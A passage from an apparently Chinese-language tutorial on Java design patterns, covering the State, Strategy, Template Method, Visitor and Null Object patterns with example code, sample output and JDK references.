        state<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        state<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        state<span>.</span><span>dispense</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setState</span><span>(</span><span>State</span> state<span>)</span> <span>{</span>
        <span>this</span><span>.</span>state <span>=</span> state<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>releaseBall</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"A gumball comes rolling out the slot..."</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>count <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            count <span>-=</span> <span>1</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getSoldOutState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> soldOutState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getNoQuarterState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> noQuarterState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getHasQuarterState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> hasQuarterState<span>;</span>
    <span>}</span>

    <span>public</span> <span>State</span> <span>getSoldState</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> soldState<span>;</span>
    <span>}</span>

    <span>public</span> <span>int</span> <span>getCount</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> count<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>GumballMachine</span> gumballMachine <span>=</span> <span>new</span> <span>GumballMachine</span><span>(</span><span>5</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>

        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>turnCrank</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code>You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
Quarter returned
You turned, but there's no quarter
You need to pay first
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You haven't insert a quarter
You insert a quarter
You can't insert another quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
Oops, out of gumballs
You can't insert a quarter, the machine is sold out
You turned, but there are no gumballs
No gumball dispensed
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_9-策略-strategy" tabindex="-1"> 9. 策略（Strategy）</h2>
<h3 id="intent-14" tabindex="-1"> Intent</h3>
<p>定义一系列算法，封装每个算法，并使它们可以互换。</p>
<p>策略模式可以让算法独立于使用它的客户端。</p>
<h3 id="class-diagram-14" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Strategy 接口定义了一个算法族，它们都实现了  behavior() 方法。</li>
<li>Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd1be8c2-755a-4a66-ad92-2e30f8f47922.png"/> </div><br>
<h3 id="与状态模式的比较" tabindex="-1"> 与状态模式的比较</h3>
<p>状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。</p>
<p>状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。</p>
<h3 id="implementation-14" tabindex="-1"> Implementation</h3>
<p>设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。</p>
<div><pre><code><span>public</span> <span>interface</span> <span>QuackBehavior</span> <span>{</span>
    <span>void</span> <span>quack</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Quack</span> <span>implements</span> <span>QuackBehavior</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"quack!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Squeak</span> <span>implements</span> <span>QuackBehavior</span><span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"squeak!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Duck</span> <span>{</span>

    <span>private</span> <span>QuackBehavior</span> quackBehavior<span>;</span>

    <span>public</span> <span>void</span> <span>performQuack</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>quackBehavior <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            quackBehavior<span>.</span><span>quack</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setQuackBehavior</span><span>(</span><span>QuackBehavior</span> quackBehavior<span>)</span> <span>{</span>
        <span>this</span><span>.</span>quackBehavior <span>=</span> quackBehavior<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Duck</span> duck <span>=</span> <span>new</span> <span>Duck</span><span>(</span><span>)</span><span>;</span>
        duck<span>.</span><span>setQuackBehavior</span><span>(</span><span>new</span> <span>Squeak</span><span>(</span><span>)</span><span>)</span><span>;</span>
        duck<span>.</span><span>performQuack</span><span>(</span><span>)</span><span>;</span>
        duck<span>.</span><span>setQuackBehavior</span><span>(</span><span>new</span> <span>Quack</span><span>(</span><span>)</span><span>)</span><span>;</span>
        duck<span>.</span><span>performQuack</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>squeak!
quack!
</code></pre></div><h3 id="jdk-12" tabindex="-1"> JDK</h3>
<ul>
<li>java.util.Comparator#compare()</li>
<li>javax.servlet.http.HttpServlet</li>
<li>javax.servlet.Filter#doFilter()</li>
</ul>
<h2 id="_10-模板方法-template-method" tabindex="-1"> 10. 模板方法（Template Method）</h2>
<h3 id="intent-15" tabindex="-1"> Intent</h3>
<p>定义算法框架，并将一些步骤的实现延迟到子类。</p>
<p>通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。</p>
<h3 id="class-diagram-15" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac6a794b-68c0-486c-902f-8d988eee5766.png"/> </div><br>
<h3 id="implementation-15" tabindex="-1"> Implementation</h3>
<p>冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/11236498-1417-46ce-a1b0-e10054256955.png"/> </div><br>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>CaffeineBeverage</span> <span>{</span>

    <span>final</span> <span>void</span> <span>prepareRecipe</span><span>(</span><span>)</span> <span>{</span>
        <span>boilWater</span><span>(</span><span>)</span><span>;</span>
        <span>brew</span><span>(</span><span>)</span><span>;</span>
        <span>pourInCup</span><span>(</span><span>)</span><span>;</span>
        <span>addCondiments</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>abstract</span> <span>void</span> <span>brew</span><span>(</span><span>)</span><span>;</span>

    <span>abstract</span> <span>void</span> <span>addCondiments</span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>boilWater</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"boilWater"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>pourInCup</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"pourInCup"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Coffee</span> <span>extends</span> <span>CaffeineBeverage</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>brew</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Coffee.brew"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Coffee.addCondiments"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Tea</span> <span>extends</span> <span>CaffeineBeverage</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>brew</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Tea.brew"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>addCondiments</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Tea.addCondiments"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>CaffeineBeverage</span> caffeineBeverage <span>=</span> <span>new</span> <span>Coffee</span><span>(</span><span>)</span><span>;</span>
        caffeineBeverage<span>.</span><span>prepareRecipe</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"-----------"</span><span>)</span><span>;</span>
        caffeineBeverage <span>=</span> <span>new</span> <span>Tea</span><span>(</span><span>)</span><span>;</span>
        caffeineBeverage<span>.</span><span>prepareRecipe</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>boilWater
Coffee.brew
pourInCup
Coffee.addCondiments
-----------
boilWater
Tea.brew
pourInCup
Tea.addCondiments
</code></pre></div><h3 id="jdk-13" tabindex="-1"> JDK</h3>
<ul>
<li>java.util.Collections#sort()</li>
<li>java.io.InputStream#skip()</li>
<li>java.io.InputStream#read()</li>
<li>java.util.AbstractList#indexOf()</li>
</ul>
<h2 id="_11-访问者-visitor" tabindex="-1"> 11. 访问者（Visitor）</h2>
<h3 id="intent-16" tabindex="-1"> Intent</h3>
<p>为一个对象结构（比如组合结构）增加新能力。</p>
<h3 id="class-diagram-16" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作</li>
<li>ConcreteVisitor：具体访问者，存储遍历过程中的累计结果</li>
<li>ObjectStructure：对象结构，可以是组合结构，或者是一个集合。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/79c6f036-bde6-4393-85a3-ef36a0327bd2.png"/> </div><br>
<h3 id="implementation-16" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Element</span> <span>{</span>
    <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>class</span> <span>CustomerGroup</span> <span>{</span>

    <span>private</span> <span>List</span><span><span>&lt;</span><span>Customer</span><span>></span></span> customers <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>Customer</span> customer <span>:</span> customers<span>)</span> <span>{</span>
            customer<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>void</span> <span>addCustomer</span><span>(</span><span>Customer</span> customer<span>)</span> <span>{</span>
        customers<span>.</span><span>add</span><span>(</span>customer<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Customer</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Order</span><span>></span></span> orders <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>Customer</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>void</span> <span>addOrder</span><span>(</span><span>Order</span> order<span>)</span> <span>{</span>
        orders<span>.</span><span>add</span><span>(</span>order<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>
        <span>for</span> <span>(</span><span>Order</span> order <span>:</span> orders<span>)</span> <span>{</span>
            order<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Order</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Item</span><span>></span></span> items <span>=</span> <span>new</span> <span>ArrayList</span><span>(</span><span>)</span><span>;</span>

    <span>Order</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>Order</span><span>(</span><span>String</span> name<span>,</span> <span>String</span> itemName<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span>itemName<span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>void</span> <span>addItem</span><span>(</span><span>Item</span> item<span>)</span> <span>{</span>
        items<span>.</span><span>add</span><span>(</span>item<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>

        <span>for</span> <span>(</span><span>Item</span> item <span>:</span> items<span>)</span> <span>{</span>
            item<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Item</span> <span>implements</span> <span>Element</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>

    <span>Item</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>accept</span><span>(</span><span>Visitor</span> visitor<span>)</span> <span>{</span>
        visitor<span>.</span><span>visit</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Visitor</span> <span>{</span>
    <span>void</span> <span>visit</span><span>(</span><span>Customer</span> customer<span>)</span><span>;</span>

    <span>void</span> <span>visit</span><span>(</span><span>Order</span> order<span>)</span><span>;</span>

    <span>void</span> <span>visit</span><span>(</span><span>Item</span> item<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>GeneralReport</span> <span>implements</span> <span>Visitor</span> <span>{</span>

    <span>private</span> <span>int</span> customersNo<span>;</span>
    <span>private</span> <span>int</span> ordersNo<span>;</span>
    <span>private</span> <span>int</span> itemsNo<span>;</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Customer</span> customer<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>customer<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        customersNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Order</span> order<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>order<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        ordersNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>visit</span><span>(</span><span>Item</span> item<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>item<span>.</span><span>getName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        itemsNo<span>++</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>displayResults</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of customers: "</span> <span>+</span> customersNo<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of orders:    "</span> <span>+</span> ordersNo<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Number of items:     "</span> <span>+</span> itemsNo<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Customer</span> customer1 <span>=</span> <span>new</span> <span>Customer</span><span>(</span><span>"customer1"</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order1"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order2"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>
        customer1<span>.</span><span>addOrder</span><span>(</span><span>new</span> <span>Order</span><span>(</span><span>"order3"</span><span>,</span> <span>"item1"</span><span>)</span><span>)</span><span>;</span>

        <span>Order</span> order <span>=</span> <span>new</span> <span>Order</span><span>(</span><span>"order_a"</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a1"</span><span>)</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a2"</span><span>)</span><span>)</span><span>;</span>
        order<span>.</span><span>addItem</span><span>(</span><span>new</span> <span>Item</span><span>(</span><span>"item_a3"</span><span>)</span><span>)</span><span>;</span>
        <span>Customer</span> customer2 <span>=</span> <span>new</span> <span>Customer</span><span>(</span><span>"customer2"</span><span>)</span><span>;</span>
        customer2<span>.</span><span>addOrder</span><span>(</span>order<span>)</span><span>;</span>

        <span>CustomerGroup</span> customers <span>=</span> <span>new</span> <span>CustomerGroup</span><span>(</span><span>)</span><span>;</span>
        customers<span>.</span><span>addCustomer</span><span>(</span>customer1<span>)</span><span>;</span>
        customers<span>.</span><span>addCustomer</span><span>(</span>customer2<span>)</span><span>;</span>

        <span>GeneralReport</span> visitor <span>=</span> <span>new</span> <span>GeneralReport</span><span>(</span><span>)</span><span>;</span>
        customers<span>.</span><span>accept</span><span>(</span>visitor<span>)</span><span>;</span>
        visitor<span>.</span><span>displayResults</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code>customer1
order1
item1
order2
item1
order3
item1
customer2
order_a
item_a1
item_a2
item_a3
Number of customers: 2
Number of orders:    4
Number of items:     6
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h3 id="jdk-14" tabindex="-1"> JDK</h3>
<ul>
<li>javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor</li>
<li>javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor</li>
</ul>
<h2 id="_12-空对象-null" tabindex="-1"> 12. 空对象（Null）</h2>
<h3 id="intent-17" tabindex="-1"> Intent</h3>
<p>使用什么都不做的空对象来代替 NULL。</p>
<p>一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。</p>
<h3 id="class-diagram-17" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/22870bbe-898f-4c17-a31a-d7c5ee5d1c10.png"/> </div><br>
<h3 id="implementation-17" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>AbstractOperation</span> <span>{</span>
    <span>abstract</span> <span>void</span> <span>request</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>RealOperation</span> <span>extends</span> <span>AbstractOperation</span> <span>{</span>
    <span>@Override</span>
    <span>void</span> <span>request</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"do something"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
